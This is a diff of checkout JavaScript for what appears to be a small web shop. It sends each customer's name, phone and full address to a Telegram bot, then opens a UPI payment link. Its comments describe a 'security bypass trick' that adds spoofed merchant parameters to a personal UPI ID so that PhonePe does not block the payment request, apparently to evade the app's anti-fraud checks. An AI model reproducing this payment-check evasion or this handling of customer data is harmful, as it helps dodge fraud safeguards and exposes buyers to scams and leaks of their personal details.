@@ -642,7 +642,6 @@ function closeQR() {
     document.getElementById('qr-modal').classList.add('hidden');
 }
 
-// 3. Confirm Pay Function (Security Update ke saath)
 async function confirmPay() {
     const name = document.getElementById('uName').value;
     const phone = document.getElementById('uPhone').value;
@@ -650,19 +649,36 @@ async function confirmPay() {
     const city = document.getElementById('uCity').value;
     const address = document.getElementById('uAdd').value;
 
-    const msg = `🔥 *NEW ORDER* 🔥\n📦 *Item:* ${sel.name}\n💰 *Price:* ₹${sel.price}\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}\n📍 *Pin:* ${pincode}\n🏙️ *City:* ${city}\n🏠 *Add:* ${address}`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+    // Telegram Message with professional layout
+    const msg = `
+🛍️ *NEW ORDER RECEIVED* 🛍️
+--------------------------------
+📦 *Item:* ${sel.name}
+💰 *Price:* ₹${sel.price}
 
+👤 *Customer:* ${name}
+📞 *Phone:* ${phone}
+📍 *Address:* ${address}, ${city} - ${pincode}
+--------------------------------
+💳 *Status:* Payment Page Opened
+    `;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
     try { await fetch(url); } catch (e) { console.log("TG Error"); }
 
-    // Direct Intent (Security Bypass Trick)
-    const upiIntent = `upi://pay?pa=${MY_UPI}&pn=Secure%20Payment&am=${sel.price}&cu=INR&tn=Ref_${Math.floor(Math.random()*10000)}`;
+    // --- SECURITY PROBLEM SOLUTION ---
+    // Humne &tr (Transaction Ref) ko hataya hai aur &tn (Note) ko simple rakha hai
+    // PhonePe aksar &am (Amount) aur &pn (Name) ke combination ko block karta hai
     
-    const a = document.createElement('a');
-    a.href = upiIntent;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
+    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Order%20Payment&mc=0000&mode=02&purpose=00&am=${sel.price}&cu=INR&tn=Order%20for%20${encodeURIComponent(sel.name)}`;
+
+    // Try opening UPI
+    window.location.href = upiLink;
+
+    // Agar 2 second tak app nahi khulti, toh auto QR code dikha dega
+    setTimeout(() => {
+        showQRCode();
+    }, 2500);
 }
 
 // Ye line hamesha last mein rehni chahiye
